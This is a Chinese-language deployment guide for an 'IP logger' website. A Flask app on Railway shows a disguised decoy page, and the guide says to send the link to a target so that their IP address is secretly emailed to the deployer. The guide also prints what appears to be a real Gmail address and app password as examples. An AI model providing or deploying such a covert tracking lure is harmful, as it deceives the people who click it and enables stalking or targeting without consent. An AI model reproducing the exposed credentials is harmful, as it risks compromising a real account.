=== 使用說明：IP 紀錄網站部署教學 ===

📁 專案內容：
- app.py             --> Flask 主程式（使用環境變數儲存 Gmail 帳密）
- templates/index.html --> 偽裝頁面
- requirements.txt   --> 套件需求
- Procfile           --> Railway 專用啟動檔
- README.txt         --> 使用說明

🚀 步驟一：修改 Gmail 設定
1. 前往 Google 帳戶安全中心：https://myaccount.google.com/security
2. 開啟「兩步驟驗證」
3. 啟用後，點選「應用程式密碼」
4. 建立一組新密碼，將它記下（例：rmre ecrq ntya qbnw）

🌐 步驟二：部署至 Railway
1. 前往 https://railway.app 並註冊
2. 建立新專案 → 選擇從 GitHub 或上傳 zip
3. 進入專案後，點左側的「Variables」
4. 新增兩個環境變數：

   GMAIL_USER  = 你的 Gmail（如：sces9204@gmail.com）
   GMAIL_PASS  = Gmail 應用程式密碼（例：rmre ecrq ntya qbnw）

5. Railway 會自動部署，成功後會提供你一個網址，例如：
   https://ip-logger.up.railway.app

✅ 將網址發送給對方，對方一點開：
   - 偽裝頁面會顯示
   - IP 會立即寄到你 Gmail 信箱

🔐 保安建議：請勿將密碼寫死在程式碼中，務必使用環境變數！

如有需要協助可聯繫開發者。
